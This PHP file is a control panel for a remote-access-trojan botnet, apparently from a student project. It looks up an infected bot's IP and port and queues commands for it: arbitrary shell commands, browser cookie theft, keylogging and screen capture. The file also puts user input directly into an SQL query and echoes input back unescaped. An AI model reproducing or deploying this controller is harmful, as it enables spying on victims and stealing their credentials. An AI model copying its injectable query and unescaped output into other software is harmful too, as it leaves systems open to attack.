<?php
$ID = "All";
$ip = "All";
$port = "All";
$bot = 'no bot';
if ((isset($_GET['ID']) && !empty($_GET['ID']))) {
    $ID = $_GET['ID'];
    $link = mysqli_connect("localhost", "root", "") or die("Khong the ket noi den CSDL MYSQL");
    mysqli_select_db($link, "pbl4_v2");
    $sql = "SELECT * FROM bot WHERE Id='$ID'";
    $result = mysqli_query($link, $sql);

    while ($row = mysqli_fetch_array($result)) {
        $ip = $row['Ip'];
        $port = $row['Port'];
        $status = $row['Status'];
    }
} else if ((isset($_POST['ID']) && !empty($_POST['ID']))) {
    $ID = $_POST['ID'];
    $link = mysqli_connect("localhost", "root", "") or die("Khong the ket noi den CSDL MYSQL");
    mysqli_select_db($link, "pbl4_v2");
    $sql = "SELECT * FROM bot WHERE Id='$ID'";
    $result = mysqli_query($link, $sql);

    while ($row = mysqli_fetch_array($result)) {
        $ip = $row['Ip'];
        $port = $row['Port'];
        $status = $row['Status'];
    }
}




$fp = fopen('botActive.txt', 'w');
fwrite($fp, $ID);
fwrite($fp, '&');
fwrite($fp, $ip);
fwrite($fp, '&');
fwrite($fp, $port);
fclose($fp);
?>

<!-- <!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Open Bot</title>
    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
            text-align: center;
            background-color: #87ceeb;
            padding: 20px;

        }

        button {
            padding: 10px;
        }
    </style>
</head>

<body>
    <div id="command-form">
        <img src="serverIcon.png" alt="" width="180vw">
        <h2>BOT RAT Administration Page</h2>
        <form method="post" action="openBot.php?ID=" id="cmdform">
            RAT BOT IP: <input type="text" name="ip" readonly value="" />
           
            <br><br>
            RAT BOT PORT: <input type="text" name="port" readonly value="" />
            <p>Please enter your command: </p>
            <input type="text" name="cmdstr" size="35%">
            <p><input type="submit" name="buttonCmd" value="Execute Cmd"></p>
            <p><input type="submit" name="buttonCookie" value="Execute Cookie"></p>
            <p><input type="submit" name="buttonKeylogger" value="Execute Keylogger"></p>
            <p><input type="submit" name="buttonCapture" value="Execute Capture"></p>
            <p><a href='index.php'>Back to Main</a></p>
        </form>
    </div>
</body>

</html> -->

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <!-- <link rel="stylesheet" type="text/css" href="../css/copy.css" /> -->
    <!-- <link rel="stylesheet" type="text/css" href="../css/openBot.css" /> -->
    <script src="https://kit.fontawesome.com/yourcode.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
    <title>Open Bot</title>
    <style>
        * {
            padding: 0;
            margin: 0;
            box-sizing: border-box;
        }

        body {
            /* background-image: url("../img/botactive.png"); */
            background: url("https://geekprank.com/hacker/green-back.jpg") no-repeat center center #000;
            color: #0f0;
            text-shadow: 0px 0px 10px #0f0;
            line-height: 21px;
            font-size: 15px;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            max-width: 100%;
            max-height: 100%;
            overflow: hidden;
        }

        .inputCommand {
            border: 4px solid rgb(75, 194, 75);
            background: black;
            border-radius: 5px;
            justify-content: center;
        }

        /* Header */
        .header {
            width: 100%;
            height: 30px;
            background-color: #00ff00;
            display: flex;
            flex-direction: row;
            justify-content: space-between;
            /* margin-bottom: 50px; */
        }

        .ul_header {
            list-style: none;
        }

        .li_header {
            display: inline-block;
        }

        .ul_header,
        .li_header {
            margin: 0;
            padding: 0;
        }

        .label_header {
            color: black;
            font-weight: 600;
            padding-left: 10px;
            padding-top: 3px;
            font-size: 20px;
        }

        .li_header_icon {
            padding: 5px 8px;
        }

        a {
            text-decoration: none;
        }

        .container {
            display: flex;
            width: 100vw;
            height: 100vh;
            padding: 30px;
            column-gap: 40px;
        }

        .inputCommand {
            width: 80%;
        }

        .navigate {
            margin-left: 30px;
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            /* justify-content: center; */
            width: 15%;
            height: min-content;
            column-gap: 20px;
            row-gap: 20px !important;
            background: transparent;
            padding: 20px;
        }

        .navigate_btn {
            min-width: 140px;
            height: 120px;
            padding: 10px;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            flex-direction: column;
            /* background: yellow;
        border: 1px solid red; */
        }

        .navigate_btn:hover {
            opacity: 0.6;
            border: 1px dotted #00ff00;
        }

        .navigate_btn-name {
            font-size: 20px;
            font-family: Arial, Helvetica, sans-serif;
            font-weight: bold;
            color: #00ff00;
            text-shadow: -1px 0px 0px #000, 1px 0px 0px #000, 0px 1px 0px #000,
                0px -1px 0px #000;
            text-align: center;
        }

        .navigate_btn-icon {
            color: #00ff00;
            margin-bottom: 4px;
            text-shadow: -1px 0px 0px #000, 1px 0px 0px #000, 0px 1px 0px #000,
                0px -1px 0px #000;
        }

        .navigate_btn:hover .navigate_btn-name,
        .navigate_btn:hover .navigate_btn-icon {
            transform: all 0.5s ease;
            color: #62fa62;
        }

        .content {
            width: 100%;
            min-height: 90%;
            padding: 30px;
        }

        .content_table {
            width: 100%;
            text-align: center;
            border: 1px solid #00ff00;
        }

        .content_table-thead {
            background: #62fa62;
            color: black;
            text-transform: uppercase;
        }

        .content_table-tr {
            font-weight: bold;
            border: 1px solid #00ff00;
        }

        .content_table-td {
            font-weight: bold;
            border: 1px solid #00ff00;
        }

        .content_table-th {
            padding: 4px 0px;
        }

        .content_form {
            width: 35%;
            height: 100%;
        }

        .content_element {
            width: 100%;
            margin-bottom: 12px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .content_element-label {
            font-size: 16px;
            min-width: 120px;
        }

        .content_element-input {
            width: 100%;
            padding: 4px 6px;
            background: transparent;
            color: #00ff00;
            border: 1px solid #00ff00;
            outline: none;
            border-radius: 4px;
        }

        .content_button {
            width: 100%;
            margin: 20px 0px;
            display: flex;
            justify-content: space-between;
        }

        .content_button-el {
            padding: 4px 8px;
            border-radius: 8px;
            border: none;
            font-size: 16px;
            font-weight: 500;
            background: #00ff00;
            outline: none;
            cursor: pointer;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="inputCommand">
            <div class="header">
                <ul class="ul_header">
                    <li class="li_header label_header">
                        <label for="">Control Bot</label>
                    </li>
                </ul>
                <ul class="ul_header">
                    <li class="li_header li_header_icon">
                        <i class="fa-solid fa-minus" style="color: black; text-shadow: none"></i>
                    </li>
                    <li class="li_header li_header_icon">
                        <i class="fa-regular fa-square" style="color: black; text-shadow: none"></i>
                    </li>
                    <li class="li_header li_header_icon">
                        <i class="fa-solid fa-x" style="color: black; text-shadow: none"></i>
                    </li>
                </ul>
            </div>
            <div class="content">
                <form class="content_form" method="post" action="openBot.php<?php
                                                                            if ($ID != "All") {
                                                                                echo '?ID=' . $ID . '';
                                                                            }
                                                                            ?>" id="cmdform">
                    <div class="content_element">
                        <label class="content_element-label" for="ip">IP:</label>
                        <input class="content_element-input" id="ip" type="text" name="ip" readonly value="<?php echo $ip ?>" />
                    </div>
                    <div class="content_element">
                        <label class="content_element-label" for="port">PORT:</label>
                        <input class="content_element-input" id="port" type="text" name="port" readonly value="<?php echo $port; ?>" />
                    </div>
                    <div style="margin-top:20px ;">
                        <label class="content_element-label" style="display: block; text-align:center; margin-bottom: 8px; text-transform: uppercase; font-size:16px;" for="command">Enter command:</label>
                        <input class="content_element-input" id="command" type="text" name="cmdstr" />
                    </div>
                    <!-- <p class="content_element-label" style="width:100%;">Enter command: </p>
                    <input class="content_element-input" type="text" name="cmdstr" > -->
                    <div class="content_button">
                        <p><input class=" content_button-el" type="submit" name="buttonCmd" value="Cmd"></p>
                        <p><input class=" content_button-el" type="submit" name="buttonCookie" value="Cookie"></p>
                        <p><input class=" content_button-el" type="submit" name="buttonKeylogger" value="Keylogger"></p>
                        <p><input class=" content_button-el" type="submit" name="buttonCapture" value="Capture"></p>
                    </div>
                    <p><a style="color: #00ff00; text-decoration:underline;" href='index.php'>Back to Main</a></p>
                </form>
            </div>
        </div>
        <div class="navigate">
            <a href="listBot.php" class="navigate_btn">
                <i class="fa-solid fa-laptop fa-5x navigate_btn-icon" style="text-shadow: none"></i>
                <p class="navigate_btn-name">All bot</p>
            </a>
            <a href="listBot.php?status=Active" class="navigate_btn">
                <i class="fa-solid fa-laptop fa-5x navigate_btn-icon" style="text-shadow: none"></i>
                <p class="navigate_btn-name">Bot Active</p>
            </a>
            <a href="listBot.php?status=Passive" class="navigate_btn">
                <i class="fa-solid fa-laptop fa-5x navigate_btn-icon" style="text-shadow: none"></i>
                <p class="navigate_btn-name">Bot Passive</p>
            </a>
        </div>
    </div>
</body>

</html>

<?php
if (isset($_POST['buttonCmd'])) {

    if (isset($_POST['cmdstr']) && !empty($_POST['cmdstr'])) {
        $cmdstr = $_POST['cmdstr']; //dữ liệu trong input
        echo 'Received cmd: ' . $cmdstr . '<br>';
        $fp = fopen('commandBot.txt', 'w');
        fwrite($fp, "getcmd");
        fwrite($fp, '&');
        fwrite($fp, $cmdstr);
        fclose($fp);
    }
} else if (isset($_POST['buttonCookie'])) {

    if (isset($_POST['cmdstr']) && !empty($_POST['cmdstr'])) {
        $cmdstr = $_POST['cmdstr']; //dữ liệu trong input
        echo 'Received link get cookies: ' . $cmdstr . '<br>';
        $fp = fopen('commandBot.txt', 'w');
        fwrite($fp, "getcookie");
        fwrite($fp, '&');
        fwrite($fp, $cmdstr);
        fclose($fp);
    }
} else if (isset($_POST['buttonKeylogger'])) {

        $temp = "abc";
        echo 'Request keylogger <br>';
        $fp = fopen('commandBot.txt', 'w');
        fwrite($fp, "getkeylogger");
        fwrite($fp, '&');
        fwrite($fp, $temp);
        fclose($fp);
    
} else if (isset($_POST['buttonCapture'])) {


        echo 'Request Capture <br>';
        $fp = fopen('commandBot.txt', 'w');
        fwrite($fp, "getcapture");
        fwrite($fp, '&');
        fwrite($fp, "aaaa");
        fclose($fp);
    
}
?>